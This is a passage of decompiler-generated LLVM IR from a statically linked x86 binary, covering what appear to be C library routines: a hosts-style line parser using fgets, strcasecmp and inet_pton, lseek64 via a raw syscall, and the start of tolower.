  %v7_8056eb1 = icmp eq i8 %v6_8056eb1, 0
  br i1 %v7_8056eb1, label %dec_label_pc_8056ea2, label %dec_label_pc_8056eb7.loopexit

dec_label_pc_8056eb7.loopexit:                    ; preds = %dec_label_pc_8056ea9, %dec_label_pc_8056ea2, %dec_label_pc_8056ea3.preheader
  %v4_8056e8397144 = phi i32 [ %v6_8056ea3108, %dec_label_pc_8056ea3.preheader ], [ %v6_8056ea3, %dec_label_pc_8056ea2 ], [ %v0_8056eac.pre, %dec_label_pc_8056ea9 ]
  %v0_8056eb7.lcssa = phi i32 [ %v0_8056ea3.pre, %dec_label_pc_8056ea3.preheader ], [ %v1_8056ea2, %dec_label_pc_8056ea2 ], [ %v0_8056eb7110, %dec_label_pc_8056ea9 ]
  %v1_8056ea3.lcssa = phi i8* [ %v1_8056ea3104, %dec_label_pc_8056ea3.preheader ], [ %v1_8056ea3, %dec_label_pc_8056ea2 ], [ %v1_8056ea3111, %dec_label_pc_8056ea9 ]
  %v2_8056eb7 = load i8, i8* %v1_8056ea3.lcssa, align 1
  %v3_8056eb7 = icmp eq i8 %v2_8056eb7, 0
  %v1_8056eba = icmp eq i1 %v3_8056eb7, false
  br i1 %v1_8056eba, label %dec_label_pc_8056e83.preheader, label %dec_label_pc_8056ebc

dec_label_pc_8056e83.preheader:                   ; preds = %dec_label_pc_8056e83.preheader.preheader, %dec_label_pc_8056eb7.loopexit
  %v1_8056ebc.pre147 = phi i32 [ %v1_8056ebc52, %dec_label_pc_8056eb7.loopexit ], [ 0, %dec_label_pc_8056e83.preheader.preheader ]
  %v4_8056e8397 = phi i32 [ %v4_8056e8397144, %dec_label_pc_8056eb7.loopexit ], [ %v4_8056e8397.pre, %dec_label_pc_8056e83.preheader.preheader ]
  %v0_8056e8347 = phi i32 [ %v0_8056eb7.lcssa, %dec_label_pc_8056eb7.loopexit ], [ %v4_8056f65, %dec_label_pc_8056e83.preheader.preheader ]
  %v1_8056e8394 = inttoptr i32 %v0_8056e8347 to i8*
  %v2_8056e8395 = load i8, i8* %v1_8056e8394, align 1
  %v3_8056e8396 = zext i8 %v2_8056e8395 to i32
  %v5_8056e8398 = and i32 %v4_8056e8397, -256
  %v6_8056e8399 = or i32 %v5_8056e8398, %v3_8056e8396
  store i32 %v6_8056e8399, i32* @eax, align 4
  %v4_8056e85100 = icmp eq i8 %v2_8056e8395, 0
  br i1 %v4_8056e85100, label %dec_label_pc_8056ebc, label %dec_label_pc_8056e89

dec_label_pc_8056e83.dec_label_pc_8056ebc.loopexit_crit_edge: ; preds = %dec_label_pc_8056e7f
  %v1_8056ebc.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056ebc

dec_label_pc_8056ebc:                             ; preds = %dec_label_pc_8056eb7.loopexit, %dec_label_pc_8056e83.dec_label_pc_8056ebc.loopexit_crit_edge, %dec_label_pc_8056e83.preheader, %dec_label_pc_8056e77
  %v1_8056ebc = phi i32 [ 0, %dec_label_pc_8056e77 ], [ %v1_8056ebc.pre.pre, %dec_label_pc_8056e83.dec_label_pc_8056ebc.loopexit_crit_edge ], [ %v1_8056ebc.pre147, %dec_label_pc_8056e83.preheader ], [ %v1_8056ebc52, %dec_label_pc_8056eb7.loopexit ]
  %v0_8056ebc = load i32, i32* @ebx, align 4
  %v2_8056ebc = mul i32 %v1_8056ebc, 4
  %v3_8056ebc = add i32 %v2_8056ebc, %v0_8056ebc
  %v4_8056ebc = inttoptr i32 %v3_8056ebc to i32*
  store i32 0, i32* %v4_8056ebc, align 4
  %v0_8056ec3 = load i32, i32* @edi, align 4
  %v7_8056ec6 = icmp sgt i32 %v0_8056ec3, 1
  br i1 %v7_8056ec6, label %dec_label_pc_8056ecc, label %dec_label_pc_8056f5f.backedge

dec_label_pc_8056ecc:                             ; preds = %dec_label_pc_8056ebc
  br i1 %v12_8056d08, label %dec_label_pc_8056f99, label %dec_label_pc_8056ed7

dec_label_pc_8056ed7:                             ; preds = %dec_label_pc_8056ecc
  store i32 1, i32* @esi, align 4
  br i1 %v1_8056ee1, label %dec_label_pc_8056ef9.lr.ph, label %dec_label_pc_8056ee3

dec_label_pc_8056ef9.lr.ph:                       ; preds = %dec_label_pc_8056ed7
  br label %dec_label_pc_8056ef9

dec_label_pc_8056ee3:                             ; preds = %dec_label_pc_8056ed7
  %v0_8056ee3 = load i32, i32* @eax, align 4
  %v0_8056ee5 = load i32, i32* @ebx, align 4
  %v1_8056ee5 = inttoptr i32 %v0_8056ee5 to i32*
  %v2_8056ee5 = load i32, i32* %v1_8056ee5, align 4
  %v5_8056eeb = call i32 @__GI_strcoll(i8* %v2_8056f02, i32 %v2_8056ee5, i32 %v0_8056ee3, i32 %v0_8056ee3)
  store i32 %v5_8056eeb, i32* %eax.global-to-local, align 4
  %v1_8056ef3 = icmp eq i32 %v5_8056eeb, 0
  %v1_8056ef5 = icmp eq i1 %v1_8056ef3, false
  br i1 %v1_8056ef5, label %dec_label_pc_8056f5f.backedge, label %dec_label_pc_8056f15

dec_label_pc_8056f5f.backedge:                    ; preds = %dec_label_pc_8056f0e, %dec_label_pc_8056ee3, %dec_label_pc_8056ebc
  %v0_8056f5f = load i32, i32* @edx, align 4
  %v3_8056f69 = call i32 @fgets(i32 %v4_8056f65, i32 %stack_var_4.0, i32 %v0_8056f5f)
  store i32 %v3_8056f69, i32* @eax, align 4
  %v1_8056f71 = icmp eq i32 %v3_8056f69, 0
  %v1_8056f73 = icmp eq i1 %v1_8056f71, false
  br i1 %v1_8056f73, label %dec_label_pc_8056e60, label %dec_label_pc_8056f79

dec_label_pc_8056ef9:                             ; preds = %dec_label_pc_8056ef9.lr.ph, %dec_label_pc_8056f0e
  %v1_8056efb119 = phi i32 [ 1, %dec_label_pc_8056ef9.lr.ph ], [ %v1_8056f0e, %dec_label_pc_8056f0e ]
  %v0_8056efb = load i32, i32* @ebx, align 4
  %v2_8056efb = mul i32 %v1_8056efb119, 4
  %v3_8056efb = add i32 %v0_8056efb, %v2_8056efb
  %v4_8056efb = inttoptr i32 %v3_8056efb to i32*
  %v5_8056efb = load i32, i32* %v4_8056efb, align 4
  %v3_8056f02 = call i32 @__GI_strcasecmp(i8* %v2_8056f02, i32 %v5_8056efb)
  store i32 %v3_8056f02, i32* %eax.global-to-local, align 4
  %v1_8056f0a = icmp eq i32 %v3_8056f02, 0
  br i1 %v1_8056f0a, label %dec_label_pc_8056f15, label %dec_label_pc_8056f0e

dec_label_pc_8056f0e:                             ; preds = %dec_label_pc_8056ef9
  %v0_8056f0e = load i32, i32* @esi, align 4
  %v1_8056f0e = add i32 %v0_8056f0e, 1
  store i32 %v1_8056f0e, i32* @esi, align 4
  %v1_8056f0f.pre = load i32, i32* @edi, align 4
  %v5_8056f11 = icmp slt i32 %v1_8056f0e, %v1_8056f0f.pre
  br i1 %v5_8056f11, label %dec_label_pc_8056ef9, label %dec_label_pc_8056f5f.backedge

dec_label_pc_8056f15:                             ; preds = %dec_label_pc_8056ee3, %dec_label_pc_8056ef9
  br i1 %v1_8056f1a, label %dec_label_pc_8056f37, label %dec_label_pc_8056f1c

dec_label_pc_8056f1c:                             ; preds = %dec_label_pc_8056f15
  %v0_8056f1c = load i32, i32* @esi, align 4
  %v3_8056f1d = load i8*, i8** %stack_var_-44, align 4
  %v4_8056f1d = ptrtoint i8* %v3_8056f1d to i32
  %v0_8056f21 = load i32, i32* @ebx, align 4
  %v1_8056f21 = inttoptr i32 %v0_8056f21 to i32*
  %v2_8056f21 = load i32, i32* %v1_8056f21, align 4
  %v4_8056f25 = inttoptr i32 %v2_8056f21 to i8*
  %v5_8056f25 = call i32 @inet_pton(i32 2, i8* %v4_8056f25, i32 %v4_8056f1d, i32 %v0_8056f1c)
  store i32 %v5_8056f25, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8056f25, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8056db5, label %dec_label_pc_8056f5f.outer.backedge

dec_label_pc_8056f5f.outer.backedge:              ; preds = %dec_label_pc_8056f1c, %dec_label_pc_8056f3e, %dec_label_pc_8056f37
  %v0_8056f5f120 = load i32, i32* @edx, align 4
  %v3_8056f69121 = call i32 @fgets(i32 %v4_8056f65, i32 %stack_var_4.0, i32 %v0_8056f5f120)
  store i32 %v3_8056f69121, i32* @eax, align 4
  %v1_8056f71122 = icmp eq i32 %v3_8056f69121, 0
  %v1_8056f73123 = icmp eq i1 %v1_8056f71122, false
  br i1 %v1_8056f73123, label %dec_label_pc_8056e60.lr.ph, label %dec_label_pc_8056f79

dec_label_pc_8056f37:                             ; preds = %dec_label_pc_8056f15
  br i1 %v1_8056f3c, label %dec_label_pc_8056f5f.outer.backedge, label %dec_label_pc_8056f3e

dec_label_pc_8056f3e:                             ; preds = %dec_label_pc_8056f37
  %v0_8056f3e = load i32, i32* @ecx, align 4
  %v0_8056f43 = load i32, i32* @ebx, align 4
  %v1_8056f43 = inttoptr i32 %v0_8056f43 to i32*
  %v2_8056f43 = load i32, i32* %v1_8056f43, align 4
  %v4_8056f47 = inttoptr i32 %v2_8056f43 to i8*
  %v5_8056f47 = call i32 @inet_pton(i32 10, i8* %v4_8056f47, i32 %stack_var_-36.0, i32 %v0_8056f3e)
  store i32 %v5_8056f47, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_8056f47, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8056de2, label %dec_label_pc_8056f5f.outer.backedge

dec_label_pc_8056f79:                             ; preds = %dec_label_pc_8056f5f.outer.backedge, %dec_label_pc_8056e49, %dec_label_pc_8056f5f.backedge, %dec_label_pc_8056e0e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8056e0e ], [ 1, %dec_label_pc_8056e49 ], [ 2, %dec_label_pc_8056f5f.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_8056f5f.backedge ]
  br i1 %v12_8056d08, label %dec_label_pc_8056f99, label %dec_label_pc_8056f80

dec_label_pc_8056f80:                             ; preds = %dec_label_pc_8056f79
  %v1_8056f87 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8056f87 = call i32 @__GI_fclose(i16* %v1_8056f87)
  store i32 %v2_8056f87, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056f99

dec_label_pc_8056f99:                             ; preds = %dec_label_pc_8056ecc, %dec_label_pc_8056ce9, %dec_label_pc_8056cf5, %dec_label_pc_8056d13, %dec_label_pc_8056d26, %dec_label_pc_8056d32, %dec_label_pc_8056d3b, %dec_label_pc_8056d65, %dec_label_pc_8056f79, %dec_label_pc_8056f80, %dec_label_pc_8056d9b
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8056f79 ], [ %stack_var_-28.1, %dec_label_pc_8056f80 ], [ %v2_8056daa, %dec_label_pc_8056d9b ], [ 34, %dec_label_pc_8056d65 ], [ 34, %dec_label_pc_8056d3b ], [ 34, %dec_label_pc_8056d32 ], [ 34, %dec_label_pc_8056d26 ], [ 34, %dec_label_pc_8056d13 ], [ 34, %dec_label_pc_8056cf5 ], [ 34, %dec_label_pc_8056ce9 ], [ %stack_var_-28.0.ph131, %dec_label_pc_8056ecc ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8056cd4, i32* @ebx, align 4
  store i32 %v0_8056cd3, i32* @esi, align 4
  store i32 %v0_8056cd2, i32* @edi, align 4
  store i32 %v0_8056cd1, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8056f0e, { 0, 2, 1 }
  uselistorder i8 %v2_8056e8395, { 1, 2, 0 }
  uselistorder i8* %v1_8056e8394, { 1, 0 }
  uselistorder i32 %v0_8056e8347, { 1, 0 }
  uselistorder i32 %v2_8056ea9, { 1, 0 }
  uselistorder i32 %v1_8056ea2, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056eac.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8056e97, { 1, 0 }
  uselistorder i32 %v0_8056e97, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8056e89, { 1, 0 }
  uselistorder i8* %v2_8056f02, { 1, 0 }
  uselistorder i32 %v4_8056f65, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8056d26, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056d01, { 1, 0 }
  uselistorder i32 %v1_8056ce4, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 16, 24, 25, 26, 0, 15, 9, 10, 19, 11, 27, 28, 2, 4, 23, 5, 6, 20, 12, 7, 21, 8, 22, 13, 14, 17, 18, 3, 1 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 14, 0, 1, 13, 2, 22, 15, 16, 23, 24, 7, 11, 3, 4, 8, 12, 5, 6, 9, 10 }
  uselistorder i32* @global_var_805b298, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 102, 0, 103, 21, 22, 104, 105, 3, 79, 78, 2, 106, 107, 6, 108, 4, 109, 5, 110, 126, 8, 81, 80, 7, 58, 59, 111, 60, 61, 62, 63, 64, 65, 135, 66, 41, 42, 43, 100, 136, 128, 129, 137, 118, 117, 9, 123, 124, 77, 112, 67, 68, 69, 70, 71, 10, 72, 73, 11, 74, 75, 76, 113, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 18, 19, 20, 101, 17, 114, 115, 116, 119, 121, 120, 122, 125, 12, 127, 134, 131, 14, 132, 15, 133, 13, 130, 16 }
  uselistorder i32 35, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 10, { 20, 2, 31, 32, 33, 34, 35, 36, 3, 25, 26, 28, 27, 4, 8, 37, 9, 30, 11, 10, 21, 5, 13, 24, 29, 12, 39, 22, 0, 23, 19, 18, 17, 14, 15, 1, 38, 6, 40, 41, 16, 7 }
  uselistorder i32 12, { 98, 99, 100, 0, 101, 20, 29, 102, 118, 24, 23, 6, 106, 7, 8, 9, 10, 11, 12, 13, 103, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 151, 28, 30, 97, 117, 31, 32, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 33, 34, 35, 36, 37, 38, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 25, 150, 107, 108, 109, 110, 152, 85, 1, 2, 86, 87, 14, 15, 88, 3, 104, 105, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 4, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 26, 71, 72, 73, 89, 90, 91, 21, 92, 93, 94, 95, 27, 22, 96, 19, 18, 17, 16, 111, 112, 113, 114, 115, 116, 5 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 2, 3, 4, 1 }
  uselistorder i32 56, { 6, 5, 11, 12, 13, 14, 15, 2, 8, 3, 9, 4, 1, 16, 10, 7, 0 }
  uselistorder i32 44, { 9, 10, 11, 6, 7, 8, 22, 13, 14, 5, 19, 21, 20, 16, 17, 18, 15, 12, 2, 1, 3, 4, 0 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 0, 1 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 19, 14, 4, 10, 5, 20, 21, 0, 11, 7, 6, 2, 13, 8, 9, 15, 16, 17, 18, 3, 1, 12 }
  uselistorder i32 -48, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 16, { 108, 107, 9, 109, 110, 29, 3, 111, 30, 112, 70, 71, 120, 121, 122, 123, 124, 125, 132, 126, 127, 128, 129, 130, 131, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 113, 114, 115, 116, 72, 73, 74, 75, 76, 77, 78, 79, 158, 31, 32, 44, 33, 65, 40, 47, 104, 48, 162, 10, 49, 50, 51, 0, 11, 151, 13, 12, 152, 1, 14, 143, 144, 37, 163, 117, 118, 80, 81, 82, 83, 84, 85, 2, 86, 87, 88, 89, 90, 15, 91, 92, 41, 93, 159, 160, 161, 119, 4, 52, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63, 64, 43, 34, 66, 67, 68, 69, 94, 95, 42, 96, 97, 6, 7, 98, 99, 100, 101, 102, 35, 36, 103, 26, 27, 28, 24, 25, 22, 23, 17, 18, 19, 20, 21, 45, 46, 105, 106, 8, 38, 145, 146, 147, 148, 149, 16, 39, 150, 5, 153, 154, 155, 156, 157 }
  uselistorder i32 8, { 143, 142, 144, 14, 15, 145, 146, 147, 148, 149, 150, 1, 151, 16, 10, 152, 153, 154, 48, 106, 51, 24, 25, 26, 27, 52, 28, 29, 30, 53, 31, 54, 32, 55, 56, 156, 107, 108, 109, 110, 111, 112, 49, 113, 114, 115, 217, 218, 45, 224, 46, 225, 47, 68, 33, 70, 141, 169, 71, 72, 171, 172, 173, 174, 175, 176, 177, 2, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 3, 73, 74, 75, 76, 77, 78, 79, 80, 188, 189, 190, 191, 192, 58, 4, 59, 5, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 57, 210, 211, 6, 212, 213, 214, 215, 7, 216, 163, 164, 17, 223, 157, 158, 18, 19, 69, 116, 117, 118, 119, 121, 122, 123, 120, 124, 125, 126, 127, 34, 35, 128, 129, 130, 131, 132, 133, 20, 219, 220, 221, 159, 160, 161, 162, 155, 222, 81, 82, 83, 84, 23, 60, 61, 62, 85, 86, 0, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 21, 99, 100, 101, 50, 102, 103, 63, 104, 64, 105, 134, 135, 136, 137, 11, 138, 12, 65, 67, 36, 66, 139, 140, 44, 43, 42, 40, 41, 37, 38, 39, 13, 165, 166, 167, 168, 22, 170, 9, 8 }
  uselistorder i32 -32, { 15, 0, 1, 2, 13, 14, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 32, { 77, 27, 78, 79, 26, 32, 84, 47, 85, 86, 87, 45, 46, 62, 24, 95, 33, 54, 74, 75, 58, 25, 56, 57, 1, 0, 2, 3, 48, 4, 55, 5, 6, 7, 8, 9, 10, 28, 82, 80, 81, 63, 64, 29, 65, 66, 67, 68, 69, 70, 71, 11, 72, 73, 49, 93, 94, 83, 92, 59, 60, 61, 76, 36, 12, 50, 51, 13, 52, 30, 15, 14, 38, 37, 34, 31, 39, 16, 17, 19, 18, 40, 21, 20, 41, 43, 23, 22, 42, 88, 89, 90, 91, 44, 35, 53 }
  uselistorder i32 4, { 264, 265, 266, 260, 258, 259, 261, 262, 263, 35, 2, 267, 268, 269, 270, 271, 272, 273, 274, 275, 43, 149, 150, 151, 44, 45, 46, 276, 77, 36, 242, 3, 4, 197, 198, 199, 200, 201, 202, 5, 277, 280, 281, 282, 283, 284, 285, 92, 286, 293, 294, 295, 99, 47, 296, 297, 298, 299, 48, 49, 50, 100, 51, 52, 53, 54, 300, 55, 301, 101, 56, 102, 103, 6, 287, 288, 289, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 84, 213, 373, 214, 374, 375, 381, 382, 0, 387, 388, 389, 376, 78, 125, 237, 238, 377, 378, 379, 380, 7, 152, 153, 154, 155, 156, 104, 245, 246, 247, 93, 312, 313, 314, 315, 157, 158, 159, 160, 161, 94, 8, 162, 163, 383, 385, 326, 327, 328, 329, 330, 331, 9, 332, 333, 334, 335, 336, 337, 338, 339, 324, 325, 165, 85, 166, 167, 168, 169, 170, 171, 172, 10, 174, 173, 340, 83, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 32, 361, 362, 364, 363, 11, 164, 384, 239, 240, 302, 303, 79, 304, 305, 306, 307, 37, 12, 38, 386, 13, 175, 215, 14, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 57, 58, 126, 39, 233, 234, 235, 290, 15, 291, 86, 292, 278, 279, 181, 176, 177, 178, 42, 105, 106, 107, 108, 179, 59, 60, 109, 16, 180, 17, 18, 33, 19, 1, 20, 182, 183, 184, 185, 186, 21, 187, 188, 189, 110, 190, 191, 192, 193, 111, 194, 112, 113, 195, 196, 236, 241, 87, 95, 96, 97, 243, 114, 115, 116, 30, 117, 118, 98, 31, 119, 120, 80, 122, 88, 61, 121, 81, 244, 76, 127, 128, 129, 74, 75, 72, 73, 130, 131, 71, 132, 69, 70, 133, 134, 68, 65, 135, 66, 67, 136, 123, 137, 62, 138, 63, 64, 139, 140, 141, 142, 143, 144, 145, 146, 147, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 82, 308, 309, 310, 311, 40, 316, 34, 22, 317, 23, 89, 90, 124, 318, 91, 24, 25, 319, 320, 321, 322, 26, 41, 27, 28, 323, 29, 365, 366, 367, 368, 369, 370, 371, 372, 390, 391, 392, 148 }
  uselistorder i32* @ebp, { 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 10, 11, 12, 1, 13, 14, 15, 4, 75, 76, 77, 82, 78, 79, 80, 81, 83, 29, 30, 84, 88, 99, 100, 129, 130, 131, 31, 32, 33, 34, 35, 183, 16, 17, 18, 58, 59, 160, 161, 162, 163, 164, 19, 20, 165, 166, 167, 168, 169, 170, 171, 172, 177, 173, 174, 175, 176, 3, 178, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 5, 36, 37, 38, 39, 40, 94, 2, 95, 96, 97, 98, 89, 90, 91, 92, 93, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 7, 8, 9, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 114, 113, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 53, 54, 55, 85, 86, 87, 21, 22, 23, 24, 25, 26, 27, 28, 56, 57, 6, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 179, 180, 184, 181, 182 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8056f99, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056f79, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8056f5f.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056f15, { 1, 0 }
  uselistorder label %dec_label_pc_8056ef9, { 1, 0 }
  uselistorder label %dec_label_pc_8056ebc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8056e83.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056ea9, { 1, 0 }
  uselistorder label %dec_label_pc_8056e77, { 1, 0 }
  uselistorder label %dec_label_pc_8056e60, { 1, 0 }
  uselistorder label %dec_label_pc_8056e60.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8056e49, { 1, 0 }
  uselistorder label %dec_label_pc_8056e0e, { 1, 0 }
  uselistorder label %dec_label_pc_8056d65, { 1, 0 }
  uselistorder label %dec_label_pc_8056cf5, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056faa = load i32, i32* @ebx, align 4
  store i32 %v0_8056faa, i32* %stack_var_-12, align 4
  %v2_8056fbe = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056fbe, i32* %esi.global-to-local, align 4
  %v1_8056fd5 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8056fd5, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8056fd5, -4095
  br i1 %tmp18, label %dec_label_pc_8056fef, label %dec_label_pc_8056fe1

dec_label_pc_8056fe1:                             ; preds = %entry
  %v2_8056fc2 = ashr i32 %arg3, 31
  %v1_8056fe1 = call i32 @__errno_location(i32 %v2_8056fc2)
  %v0_8056fe6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056fe6 = sub i32 0, %v0_8056fe6
  %v2_8056fe8 = inttoptr i32 %v1_8056fe1 to i32*
  store i32 %v1_8056fe6, i32* %v2_8056fe8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8057003.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8056ff3

dec_label_pc_8056fef:                             ; preds = %entry
  %v1_8056fef = icmp eq i32 %v1_8056fd5, 0
  br i1 %v1_8056fef, label %dec_label_pc_8056ff8, label %dec_label_pc_8056ff3

dec_label_pc_8056ff3:                             ; preds = %dec_label_pc_8056fef, %dec_label_pc_8056fe1
  %v2_8057003.pre = phi i32 [ %v0_8056faa, %dec_label_pc_8056fef ], [ %v2_8057003.pre.pre, %dec_label_pc_8056fe1 ]
  %v0_8056ff3 = phi i32 [ %v1_8056fd5, %dec_label_pc_8056fef ], [ -1, %dec_label_pc_8056fe1 ]
  %v1_8056ff5 = ashr i32 %v0_8056ff3, 31
  br label %dec_label_pc_8057000

dec_label_pc_8056ff8:                             ; preds = %dec_label_pc_8056fef
  %v3_8056ff8 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8057000

dec_label_pc_8057000:                             ; preds = %dec_label_pc_8056ff3, %dec_label_pc_8056ff8
  %v2_8057003 = phi i32 [ %v2_8057003.pre, %dec_label_pc_8056ff3 ], [ %v0_8056faa, %dec_label_pc_8056ff8 ]
  %v0_8057006 = phi i32 [ %v0_8056ff3, %dec_label_pc_8056ff3 ], [ %v3_8056ff8, %dec_label_pc_8056ff8 ]
  %storemerge = phi i32 [ %v1_8056ff5, %dec_label_pc_8056ff3 ], [ %tmp, %dec_label_pc_8056ff8 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_8057003, i32* @ebx, align 4
  ret i32 %v0_8057006

; uselistorder directives
  uselistorder i32 %v1_8056fd5, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8056faa, { 1, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 60, 48, 71, 70, 69, 47, 46, 59, 58, 45, 25, 42, 57, 56, 30, 50, 24, 64, 13, 12, 11, 10, 9, 68, 8, 23, 22, 7, 21, 52, 51, 62, 61, 67, 66, 65, 63, 20, 19, 40, 18, 41, 55, 54, 53, 2, 44, 43, 14, 49, 6, 5, 39, 32, 31, 38, 29, 1, 16, 3, 28, 15, 37, 36, 34, 27, 26, 35, 0, 4, 72, 33, 17 }
  uselistorder i32 31, { 21, 22, 16, 23, 24, 31, 32, 25, 26, 12, 2, 3, 0, 1, 11, 30, 17, 18, 19, 6, 7, 4, 5, 13, 8, 9, 27, 28, 20, 14, 15, 29, 10, 33, 34, 35, 36, 37 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057000, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_805700c = add i32 %arg1, 128
  %v6_8057017 = icmp ugt i32 %v1_805700c, 383
  br i1 %v6_8057017, label %dec_label_pc_8057022, label %dec_label_pc_8057019

dec_label_pc_8057019:                             ; preds = %entry
  %v0_8057019 = load i32, i32* bitcast (i32** @global_var_805b500.484 to i32*), align 256
  %v2_805701e = mul i32 %arg1, 2
  %v3_805701e = add i32 %v0_8057019, %v2_805701e
  %v4_805701e = inttoptr i32 %v3_805701e to i16*
  %v5_805701e = load i16, i16* %v4_805701e, align 2
  %v6_805701e = sext i16 %v5_805701e to i32
  store i32 %v6_805701e, i32* @edx, align 4
  br label %dec_label_pc_8057022

dec_label_pc_8057022:                             ; preds = %entry, %dec_label_pc_8057019
